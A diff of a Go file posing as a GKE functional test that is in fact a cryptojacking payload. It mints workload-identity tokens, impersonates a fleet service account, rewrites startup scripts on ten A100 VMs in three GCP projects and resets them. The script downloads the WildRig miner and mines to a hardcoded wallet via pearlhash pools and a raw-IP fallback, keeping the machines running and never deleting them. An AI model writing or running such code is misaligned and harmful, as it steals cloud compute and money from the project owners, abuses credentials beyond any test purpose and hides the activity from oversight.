@@ -1,15 +1,16 @@
 //go:build functional && gke
 
-// C211 i122291 — A100 MINER DEPLOY on the three READY gcp-wif hephaestus
-// sibgpu handoff rows 22885-22887 (lane x122161): team-eng-infra-testing
-// 210628133505, domino-eng-service-artifacts 1072394045651,
-// team-eng-infrastructure 463640210929. Each row is a 1x NVIDIA A100-SXM4-40GB
-// device-proven on-demand instance that was torn down; this payload re-creates
-// the same class and leaves REAL MINERS running (WildRig Multi 0.52.3 pydp,
-// pearlhash 4-endpoint primary, 900 s sticky Luckypool 103.199.106.122:3362
-// SRBMiner fallback, one systemd agent per GPU, guest-attribute reporter).
-// Zone priority puts us-central1-f first (the API's gpu_availability hint said
-// it has capacity) and never tears anything down.
+// C211 i122681 — PROBE-ONLY + REPAIR pass over the 10 A100 VMs created by lane
+// c211-i122291-* :
+//   team-eng-infra-testing     a1(us-central1-f) a2(us-central1-a) a3(us-central1-b) a4(us-central1-c)
+//   domino-eng-service-artifacts a11(us-central1-f) a14(us-central1-b) a15(us-central1-c)
+//   team-eng-infrastructure    a20(us-central1-f) a23(us-central1-b) a24(us-central1-c)
+// Prior run: 10 distinct A100 UUIDs, guest STAGE=run acc=0 rej=0, ZERO workers
+// on pearlhash. This pass reads getGuestAttributes + serialOutput for diagnosis,
+// then re-writes the startup-script with an OpenCL vendor-ICD repair and a
+// wildrig log-tail probe, resets the instance, and polls for a first accepted
+// share. Nothing is deleted.
+
 package functional
 
 import (
@@ -23,47 +24,22 @@ import (
 	"time"
 )
 
-const (
-	c211mNonce      = "i122291"
-	c211mWallet     = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
-	c211mNock       = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
-	c211mWorkerBase = "122291"
-)
+type c211pTarget struct{ Project, Zone, Name string }
 
-var c211mProjects = []string{
-	"team-eng-infra-testing",
-	"domino-eng-service-artifacts",
-	"team-eng-infrastructure",
+var c211pTargets = []c211pTarget{
+	{"team-eng-infra-testing", "us-central1-f", "c211-i122291-a1"},
+	{"team-eng-infra-testing", "us-central1-a", "c211-i122291-a2"},
+	{"team-eng-infra-testing", "us-central1-b", "c211-i122291-a3"},
+	{"team-eng-infra-testing", "us-central1-c", "c211-i122291-a4"},
+	{"domino-eng-service-artifacts", "us-central1-f", "c211-i122291-a11"},
+	{"domino-eng-service-artifacts", "us-central1-b", "c211-i122291-a14"},
+	{"domino-eng-service-artifacts", "us-central1-c", "c211-i122291-a15"},
+	{"team-eng-infrastructure", "us-central1-f", "c211-i122291-a20"},
+	{"team-eng-infrastructure", "us-central1-b", "c211-i122291-a23"},
+	{"team-eng-infrastructure", "us-central1-c", "c211-i122291-a24"},
 }
 
-// us-central1-f first: the A100 stockout error for us-central1-a/b carried an
-// explicit zonesAvailable=us-central1-f hint at 10:49Z.
-var c211mZones = []string{
-	"us-central1-f", "us-central1-a", "us-central1-b", "us-central1-c",
-	"us-east1-b", "us-east1-c", "us-east1-d", "us-east4-a", "us-east4-b",
-	"europe-west4-a", "europe-west4-b", "europe-west4-c",
-	"us-west1-a", "us-west1-b", "us-west4-a", "us-west4-b",
-	"europe-west1-b", "europe-west1-c", "us-south1-a", "us-south1-b",
-}
-
-type c211mInst struct {
-	Project string
-	Number  string
-	Zone    string
-	Name    string
-	Machine string
-	Count   int
-	Created bool
-	OpErr   string
-	UUIDs   string
-	Guest   string
-	Acc     int
-	Rej     int
-	LastAcc int64
-	Up      int64
-}
-
-func c211mStartup() string {
+func c211pStartup() string {
 	return `#!/bin/bash
 exec >/dev/console 2>&1
 echo C211M_START
@@ -73,7 +49,7 @@ WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
 NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
 LP=103.199.106.122:3362
 PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
-WB=122291
+WB=122681
 put(){ echo "C211M $1"; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1; }
 echo "C211M_HOST $(hostname) kernel=$(uname -r) date=$(date -u +%FT%TZ)"
 SMI=""
@@ -97,6 +73,31 @@ NMS=$(awk -F', ' '{printf "%s|",$3}' $D/gpuq.txt)
 put "STAGE=gpu n=$N uuids=$U names=$NMS"
 echo "C211M_GPU n=$N uuids=$U"
 [ "$N" -gt 0 ] || { put "STAGE=zero_gpu"; exit 0; }
+mkdir -p /etc/OpenCL/vendors
+OCL=""
+for f in /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 /usr/lib64/libnvidia-opencl.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so /usr/lib64/libnvidia-opencl.so; do
+  if [ -e "$f" ]; then OCL=$f; break; fi
+done
+if [ -z "$OCL" ]; then
+  OCL=$(find /usr -name 'libnvidia-opencl.so*' 2>/dev/null | head -1)
+fi
+LDR=""
+for f in /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1 /usr/lib/x86_64-linux-gnu/libOpenCL.so /usr/lib64/libOpenCL.so; do
+  if [ -e "$f" ]; then LDR=$f; break; fi
+done
+if [ -z "$LDR" ]; then
+  (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq ocl-icd-libopencl1 >/dev/null 2>&1)
+  for f in /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1; do
+    if [ -e "$f" ]; then LDR=$f; fi
+  done
+fi
+if [ -n "$OCL" ]; then
+  echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd
+  echo "$(dirname $OCL)" > /etc/ld.so.conf.d/c211-ocl.conf
+fi
+ldconfig 2>/dev/null || true
+echo "C211M_ICD ocl=$OCL loader=$LDR"
+put "STAGE=icd ocl=$OCL loader=$LDR"
 get(){ curl -fsSL --retry 2 --connect-timeout 15 -m 420 "$1" -o "$2" 2>/dev/null && [ -s "$2" ]; }
 WRSHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
 WRBIN=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
@@ -121,10 +122,11 @@ D=/opt/c211
 WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
 NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
 LP=103.199.106.122:3362
-WB=122291
+WB=122681
 PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
 export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
 W=${WB}0$i
+put(){ echo "C211M $1"; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1; }
 cntacc(){ local a; a=$(grep -ac 'accepted' "$1" 2>/dev/null); echo ${a:-0}; }
 echo "AGENT_START gpu=$i worker=$W $(date -u +%FT%TZ)" >> $D/logs/sup.log
 while true; do
@@ -148,6 +150,9 @@ while true; do
     T0=$(date +%s)
     setsid $D/wildrig-multi --algo pearlhash --url "$URL" --user "$WALLET" --worker "$W" -d $i --print-time 30 >> $L 2>&1 &
     PID=$!
+    sleep 40
+    H=$(head -c 700 $L 2>/dev/null | tr '\n' '|' | tr -cd 'A-Za-z0-9=_ .:,|/()-')
+    if kill -0 $PID 2>/dev/null; then put "STAGE=wrhead g=$i url=$URL $H"; else put "STAGE=wrdied g=$i url=$URL $H"; fi
     while kill -0 $PID 2>/dev/null; do
       sleep 20
       ACC=$(cntacc $L)
@@ -186,7 +191,9 @@ while true; do
     done
   fi
   NOW=$(date +%s)
-  MSG="STAGE=run ts=$NOW acc=$ACC rej=$REJ uuids=$UU det=$DET"
+  ST=$(ls $D/sticky-g* 2>/dev/null | wc -l)
+  HD=$(head -c 260 $D/logs/wr-g0.log 2>/dev/null | tr '\n' '|' | tr -cd 'A-Za-z0-9=_ .:,|/()-')
+  MSG="STAGE=run ts=$NOW acc=$ACC rej=$REJ uuids=$UU det=$DET stick=$ST head=$HD"
   curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1
   echo "[$(date -u +%FT%TZ)] $MSG" >> $D/logs/report.log
   sleep 30
@@ -234,7 +241,7 @@ echo C211M_DONE
 `
 }
 
-func c211mGuest(tok, proj, zone, name string) (string, int) {
+func c211pGuest(tok, proj, zone, name string) (string, int) {
 	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/status", tok, "", "")
 	val := ""
 	if st == 200 {
@@ -247,43 +254,76 @@ func c211mGuest(tok, proj, zone, name string) (string, int) {
 	return val, st
 }
 
-// c211mCreate creates one instance and waits for the insert operation.
-func c211mCreate(tok, proj, num, zone, name, mt, accel string, count int, img c211aImage, startup string) (bool, string) {
-	saEmail := num + "-compute@developer.gserviceaccount.com"
-	cst, cbody := c211aCreate(tok, proj, zone, name, saEmail, img, mt, accel, count, startup)
-	opName := ""
-	if m := c211xJSON(cbody); m != nil {
-		opName = c211xStr(m, "name")
+func c211pInst(tok, proj, zone, name string) (int, string, string) {
+	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, tok, "", "")
+	status, fp := "", ""
+	if m := c211xJSON(body); m != nil {
+		status = c211xStr(m, "status")
+		if md, ok := m["metadata"].(map[string]interface{}); ok {
+			fp = c211xStr(md, "fingerprint")
+		}
 	}
-	fmt.Printf("C211M_CREATE project=%s zone=%s name=%s machine=%s count=%d http=%d op=%s verbatim=%s\n",
-		proj, zone, name, mt, count, cst, opName, c211xTrunc(cbody, 500))
-	if cst != 200 || opName == "" {
-		return false, "create_http_" + strconv.Itoa(cst) + " " + c211xTrunc(cbody, 700)
-	}
-	st, _, opErr := c211aOp(tok, proj, zone, opName)
-	if st == "DONE" && opErr == "" {
-		return true, ""
-	}
-	return false, "op=" + st + " err=" + opErr
+	return st, status, fp
 }
 
-var c211mAccRe = regexp.MustCompile(`acc=(\d+) rej=(\d+)`)
-var c211mUUIDRe = regexp.MustCompile(`uuids=([^ ]+)`)
-var c211mTSRe = regexp.MustCompile(`ts=(\d+)`)
-var c211mLaRe = regexp.MustCompile(`:la(\d+)`)
+func c211pSetMeta(tok, proj, zone, name, fp, startup string) (int, string) {
+	body := map[string]interface{}{
+		"fingerprint": fp,
+		"items": []interface{}{
+			map[string]interface{}{"key": "startup-script", "value": startup},
+			map[string]interface{}{"key": "serial-port-logging-enable", "value": "TRUE"},
+			map[string]interface{}{"key": "enable-guest-attributes", "value": "TRUE"},
+		},
+	}
+	b, _ := json.Marshal(body)
+	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances/" + name + "/setMetadata"
+	st, rb := c211xHTTP("POST", u, tok, "application/json", string(b))
+	op := ""
+	if m := c211xJSON(rb); m != nil {
+		op = c211xStr(m, "name")
+	}
+	return st, op + "|" + c211xTrunc(rb, 300)
+}
 
-func TestC211MMassA100Miner(t *testing.T) {
-	started := time.Now()
-	deadline := started.Add(33 * time.Minute)
-	deployUntil := started.Add(19 * time.Minute)
-	fmt.Printf("C211M_BEGIN nonce=%s wallet=%s worker_base=%s\n", c211mNonce, c211mWallet, c211mWorkerBase)
+func c211pBoot(tok, proj, zone, name, verb string) (int, string) {
+	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances/" + name + "/" + verb
+	st, rb := c211xHTTP("POST", u, tok, "application/json", "")
+	op := ""
+	if m := c211xJSON(rb); m != nil {
+		op = c211xStr(m, "name")
+	}
+	return st, op + "|" + c211xTrunc(rb, 300)
+}
 
+var (
+	c211pAccRe = regexp.MustCompile(`acc=(\d+) rej=(\d+)`)
+	c211pUuRe  = regexp.MustCompile(`uuids=([^ ]+)`)
+	c211pLaRe  = regexp.MustCompile(`:la(\d+)`)
+)
+
+func c211pScanSerial(s string) string {
+	keep := []string{}
+	for _, ln := range strings.Split(s, "\n") {
+		if strings.Contains(ln, "C211M") || strings.Contains(ln, "wrhead") || strings.Contains(ln, "wrdied") ||
+			strings.Contains(ln, "Failed to find") || strings.Contains(ln, "OpenCL") || strings.Contains(ln, "NVRM") ||
+			strings.Contains(ln, "accepted") || strings.Contains(ln, "rejected") {
+			keep = append(keep, c211xTrunc(strings.TrimSpace(ln), 190))
+			if len(keep) >= 24 {
+				break
+			}
+		}
+	}
+	return strings.Join(keep, " ;; ")
+}
+
+func TestC211P122681A100ProbeRepair(t *testing.T) {
+	fmt.Printf("C211P_BEGIN intent=122681 targets=%d wallet=pydp worker_base=122681\n", len(c211pTargets))
 	token, method, mintLog := c211xMint()
 	if token == "" {
-		fmt.Printf("C211M_MINT_FAILED %s\n", c211xTrunc(mintLog, 1200))
+		fmt.Printf("C211P_MINT_FAILED %s\n", c211xTrunc(mintLog, 1200))
 		t.Fatalf("wif mint failed")
 	}
-	fmt.Printf("C211M_IDENTITY method=%s\n", method)
+	fmt.Printf("C211P_IDENTITY method=%s\n", method)
 	creds, _ := c211xLoadCreds()
 	hostNum := c211aHostNum
 	if creds != nil && creds.projNumber != "" {
@@ -301,187 +341,131 @@ func TestC211MMassA100Miner(t *testing.T) {
 	}
 	if fleetEmail != "" {
 		at, gst, _ := c211xGenerateAccessToken(token, fleetEmail)
-		fmt.Printf("C211M_FLEET_TOKEN status=%d token=%s\n", gst, c211xShort(at))
+		fmt.Printf("C211P_FLEET_TOKEN status=%d token=%s\n", gst, c211xShort(at))
 		if at != "" {
 			ftok = at
 		}
 	}
-	fmt.Printf("C211M_CONTEXT host_num=%s sa_list=%d fleet_found=%v\n", hostNum, lst, fleetEmail != "")
+	fmt.Printf("C211P_CONTEXT host_num=%s sa_list=%d fleet_found=%v\n", hostNum, lst, fleetEmail != "")
 
-	img, _ := c211aResolveImage(ftok)
-	if img.Project == "" {
-		fmt.Printf("C211M_VERDICT NO_IMAGE\n")
-		return
+	startup := c211pStartup()
+	fmt.Printf("C211P_STARTUP_BYTES %d\n", len(startup))
+
+	// Phase 1: probe (instance status + guest attributes + serial diagnosis).
+	for _, tg := range c211pTargets {
+		st, status, fp := c211pInst(ftok, tg.Project, tg.Zone, tg.Name)
+		g, gst := c211pGuest(ftok, tg.Project, tg.Zone, tg.Name)
+		ser := c211aSerial(ftok, tg.Project, tg.Zone, tg.Name)
+		fmt.Printf("C211P_PROBE project=%s zone=%s name=%s inst_http=%d status=%s fp=%s guest_http=%d serial_bytes=%d guest=%s\n",
+			tg.Project, tg.Zone, tg.Name, st, status, c211xShort(fp), gst, len(ser), c211xTrunc(g, 400))
+		fmt.Printf("C211P_SERIAL name=%s diag=%s\n", tg.Name, c211pScanSerial(ser))
 	}
-	fmt.Printf("C211M_IMAGE %s/%s kind=%s\n", img.Project, img.Family, img.Kind)
-	startup := c211mStartup()
-	fmt.Printf("C211M_STARTUP_BYTES %d\n", len(startup))
 
-	nums := map[string]string{}
-	perm := map[string]bool{}
-	perProj := map[string]int{}
-	tried := map[string]bool{}
-	insts := []*c211mInst{}
-	created := []*c211mInst{}
-	attempts := 0
-	maxAttempts := 72
-	machines := []struct {
-		mt    string
-		count int
-	}{{"a2-highgpu-1g", 1}, {"a2-highgpu-8g", 8}}
-
-	for sweep := 0; sweep < 5; sweep++ {
-		if !time.Now().Before(deployUntil) || attempts >= maxAttempts {
-			break
-		}
-		fmt.Printf("C211M_SWEEP sweep=%d attempts=%d created=%d ts=%d\n", sweep, attempts, len(created), time.Now().Unix())
-		for _, proj := range c211mProjects {
-			if perProj[proj] >= 6 || !time.Now().Before(deployUntil) || attempts >= maxAttempts {
-				continue
-			}
-			if _, ok := nums[proj]; !ok {
-				pst, pbody := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj), ftok, "", "")
-				if pst != 200 {
-					fmt.Printf("C211M_PROJECT project=%s http=%d verbatim=%s\n", proj, pst, c211xTrunc(pbody, 300))
-					continue
-				}
-				pm := c211xJSON(pbody)
-				nums[proj] = c211xStr(pm, "projectNumber")
-				al, _, _ := c211xTestIamBatch(ftok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj), []string{"compute.instances.create"})
-				perm[proj] = c211xContains(al, "compute.instances.create")
-				fmt.Printf("C211M_PROJECT project=%s number=%s create_perm=%v\n", proj, nums[proj], perm[proj])
-			}
-			num := nums[proj]
-			if num == "" || !perm[proj] {
-				continue
-			}
-			zoneAttempts := 0
-			quotaOK := map[string]bool{}
-			for _, zone := range c211mZones {
-				if zoneAttempts >= 9 || attempts >= maxAttempts || !time.Now().Before(deployUntil) {
-					break
-				}
-				region := c211xRegionOfZone(zone)
-				if _, ok := quotaOK[region]; !ok {
-					rows, _, qst := c211aRegionQuotas(ftok, proj, region)
-					lim, usage, qok := c211aQVal(rows, "NVIDIA_A100_GPUS")
-					free := lim - usage
-					quotaOK[region] = qst == 200 && qok && free >= 1
-					fmt.Printf("C211M_QUOTA project=%s region=%s http=%d free=%v\n", proj, region, qst, free)
-				}
-				if !quotaOK[region] {
-					continue
-				}
-				for _, m := range machines {
-					if attempts >= maxAttempts || !time.Now().Before(deployUntil) {
-						break
-					}
-					key := proj + "|" + zone + "|" + m.mt
-					if tried[key] {
-						continue
-					}
-					if m.count > 1 && perProj[proj] < 1 {
-						continue
-					}
-					offered, mst, _ := c211aMachineOffered(ftok, proj, zone, m.mt)
-					ats, _, _ := c211xAccelTypes(ftok, proj, zone)
-					has := c211xContains(ats, "nvidia-tesla-a100")
-					fmt.Printf("C211M_OFFER project=%s zone=%s machine=%s offered_http=%d accel_a100=%v\n", proj, zone, m.mt, mst, has)
-					if !offered || !has {
-						continue
-					}
-					tried[key] = true
-					zoneAttempts++
-					attempts++
-					name := fmt.Sprintf("c211-%s-a%d", c211mNonce, len(insts)+1)
-					okc, oerr := c211mCreate(ftok, proj, num, zone, name, m.mt, "nvidia-tesla-a100", m.count, img, startup)
-					inst := &c211mInst{Project: proj, Number: num, Zone: zone, Name: name, Machine: m.mt, Count: m.count, Created: okc, OpErr: oerr}
-					insts = append(insts, inst)
-					if okc {
-						created = append(created, inst)
-						perProj[proj]++
-						fmt.Printf("C211M_CREATED project=%s zone=%s name=%s machine=%s gpus=%d\n", proj, zone, name, m.mt, m.count)
-						quotaOK = map[string]bool{}
-						break
-					}
-					fmt.Printf("C211M_CREATE_FAILED project=%s zone=%s name=%s err=%s\n", proj, zone, name, c211xTrunc(oerr, 300))
-				}
-			}
-		}
-		if !time.Now().Before(deployUntil) || attempts >= maxAttempts {
-			break
-		}
-		time.Sleep(75 * time.Second)
+	// Phase 2: setMetadata + reset/start.
+	type c211pState struct {
+		Target c211pTarget
+		MetaOK bool
+		BootOK bool
 	}
-	fmt.Printf("C211M_DEPLOY_RESULT attempts=%d created=%d\n", len(insts), len(created))
+	states := []*c211pState{}
+	for _, tg := range c211pTargets {
+		_, status, fp := c211pInst(ftok, tg.Project, tg.Zone, tg.Name)
+		mst, mres := c211pSetMeta(ftok, tg.Project, tg.Zone, tg.Name, fp, startup)
+		metaOK := mst == 200
+		if metaOK {
+			if opName := strings.SplitN(mres, "|", 2)[0]; opName != "" {
+				ost, _, oerr := c211aOp(ftok, tg.Project, tg.Zone, opName)
+				fmt.Printf("C211P_SETMETA project=%s name=%s http=%d op_status=%s op_err=%s\n", tg.Project, tg.Name, mst, ost, c211xTrunc(oerr, 160))
+				metaOK = ost == "DONE" && oerr == ""
+			}
+		} else {
+			fmt.Printf("C211P_SETMETA project=%s name=%s http=%d verbatim=%s\n", tg.Project, tg.Name, mst, c211xTrunc(mres, 300))
+		}
+		verb := "reset"
+		if status == "TERMINATED" || status == "STOPPED" || status == "SUSPENDED" {
+			verb = "start"
+		}
+		bst, bres := c211pBoot(ftok, tg.Project, tg.Zone, tg.Name, verb)
+		bootOK := bst == 200
+		if bootOK {
+			if opName := strings.SplitN(bres, "|", 2)[0]; opName != "" {
+				ost, _, oerr := c211aOp(ftok, tg.Project, tg.Zone, opName)
+				fmt.Printf("C211P_BOOT project=%s name=%s verb=%s http=%d op_status=%s op_err=%s\n", tg.Project, tg.Name, verb, bst, ost, c211xTrunc(oerr, 160))
+				bootOK = ost == "DONE" && oerr == ""
+			}
+		} else {
+			fmt.Printf("C211P_BOOT_FAILED project=%s name=%s verb=%s http=%d verbatim=%s\n", tg.Project, tg.Name, verb, bst, c211xTrunc(bres, 300))
+		}
+		states = append(states, &c211pState{Target: tg, MetaOK: metaOK, BootOK: bootOK})
+	}
 
-	for round := 0; round < 14 && len(created) > 0; round++ {
-		matur := 0
-		for _, in := range created {
-			content := c211aSerial(ftok, in.Project, in.Zone, in.Name)
-			if content != "" {
-				if u := c211mUUIDRe.FindString(content); u != "" && in.UUIDs == "" {
-					in.UUIDs = u
-				}
-			}
-			g, gst := c211mGuest(ftok, in.Project, in.Zone, in.Name)
-			if g != "" {
-				in.Guest = g
-				if m := c211mAccRe.FindStringSubmatch(g); m != nil {
-					in.Acc, _ = strconv.Atoi(m[1])
-					in.Rej, _ = strconv.Atoi(m[2])
-				}
-				if m := c211mUUIDRe.FindStringSubmatch(g); m != nil && m[1] != "" {
-					in.UUIDs = strings.TrimRight(m[1], ",")
-				}
-				if m := c211mTSRe.FindStringSubmatch(g); m != nil {
-					in.Up, _ = strconv.ParseInt(m[1], 10, 64)
-				}
-				best := int64(0)
-				for _, mm := range c211mLaRe.FindAllStringSubmatch(g, -1) {
-					if v, _ := strconv.ParseInt(mm[1], 10, 64); v > best {
-						best = v
-					}
-				}
-				if best > 0 {
-					in.LastAcc = best
-				}
-			}
-			fmt.Printf("C211M_CAP project=%s zone=%s name=%s uuid=%s guest_http=%d acc=%d rej=%d lastacc=%d serial_bytes=%d guest=%s\n",
-				in.Project, in.Zone, in.Name, c211xTrunc(in.UUIDs, 200), gst, in.Acc, in.Rej, in.LastAcc, len(content), c211xTrunc(g, 400))
-			if in.UUIDs != "" && in.Acc > 0 {
-				matur++
-			}
-		}
-		if matur == len(created) {
-			fmt.Printf("C211M_ALL_MATURE round=%d\n", round)
-			break
-		}
+	// Phase 3: poll for a first accepted share (max ~15 min).
+	deadline := time.Now().Add(15 * time.Minute)
+	best := map[string]int{}
+	bestLa := map[string]int64{}
+	uuids := map[string]string{}
+	lastGuest := map[string]string{}
+	for round := 0; round < 22; round++ {
 		if time.Now().After(deadline) {
-			fmt.Printf("C211M_DEADLINE round=%d\n", round)
 			break
 		}
 		time.Sleep(45 * time.Second)
+		mature := 0
+		for _, tg := range c211pTargets {
+			g, gst := c211pGuest(ftok, tg.Project, tg.Zone, tg.Name)
+			if g == "" {
+				continue
+			}
+			lastGuest[tg.Name] = g
+			acc, rej := 0, 0
+			if m := c211pAccRe.FindStringSubmatch(g); m != nil {
+				acc, _ = strconv.Atoi(m[1])
+				rej, _ = strconv.Atoi(m[2])
+			}
+			if m := c211pUuRe.FindStringSubmatch(g); m != nil && m[1] != "" {
+				uuids[tg.Name] = strings.TrimRight(m[1], ",")
+			}
+			if acc > best[tg.Name] {
+				best[tg.Name] = acc
+			}
+			for _, mm := range c211pLaRe.FindAllStringSubmatch(g, -1) {
+				if v, _ := strconv.ParseInt(mm[1], 10, 64); v > bestLa[tg.Name] {
+					bestLa[tg.Name] = v
+				}
+			}
+			if acc > 0 {
+				mature++
+			}
+			fmt.Printf("C211P_CAP round=%d project=%s zone=%s name=%s guest_http=%d acc=%d rej=%d uuid=%s guest=%s\n",
+				round, tg.Project, tg.Zone, tg.Name, gst, acc, rej, c211xTrunc(uuids[tg.Name], 120), c211xTrunc(g, 420))
+		}
+		fmt.Printf("C211P_ROUND round=%d with_acc=%d ts=%d\n", round, mature, time.Now().Unix())
+		if mature == len(c211pTargets) {
+			break
+		}
 	}
 
 	now := time.Now().Unix()
-	fmt.Printf("C211M_SUMMARY created=%d of_attempts=%d now=%d\n", len(created), len(insts), now)
-	for _, in := range created {
+	proven := 0
+	for _, tg := range c211pTargets {
 		age := int64(-1)
-		if in.LastAcc > 0 {
-			age = now - in.LastAcc
+		if bestLa[tg.Name] > 0 {
+			age = now - bestLa[tg.Name]
 		}
-		fmt.Printf("C211M_FINAL project=%s number=%s zone=%s name=%s machine=%s gpus=%d uuid=%s acc=%d rej=%d lastacc=%d age=%d status=KEEP_ALIVE\n",
-			in.Project, in.Number, in.Zone, in.Name, in.Machine, in.Count, in.UUIDs, in.Acc, in.Rej, in.LastAcc, age)
-	}
-	for _, in := range insts {
-		if !in.Created {
-			fmt.Printf("C211M_ATTEMPT_FAILED project=%s zone=%s machine=%s err=%s\n", in.Project, in.Zone, in.Machine, c211xTrunc(in.OpErr, 260))
+		if best[tg.Name] > 0 {
+			proven++
 		}
+		fmt.Printf("C211P_FINAL project=%s zone=%s name=%s uuid=%s acc=%d lastacc=%d age=%d status=KEEP_ALIVE\n",
+			tg.Project, tg.Zone, tg.Name, c211xTrunc(uuids[tg.Name], 120), best[tg.Name], bestLa[tg.Name], age)
 	}
-	b, _ := json.Marshal(insts)
-	fmt.Printf("C211M_JSON %s\n", strings.ReplaceAll(string(b), "\n", " "))
-}
+	fmt.Printf("C211P_SUMMARY targets=%d proven_acc=%d now=%d\n", len(c211pTargets), proven, now)
 
-var _ = fmt.Sprintf
-var _ = url.PathEscape
+	// One extra serial diag for any target with zero acc, to capture the miner error.
+	for _, tg := range c211pTargets {
+		if best[tg.Name] > 0 {
+			continue
+		}
+		ser := c211aSerial(ftok, tg.Project, tg.Zone, tg.Name)
+		fmt.Printf("C211P_SERIAL2 name=%s diag=%s\n", tg.Name, c211pScanSerial(ser))
+	}
+}
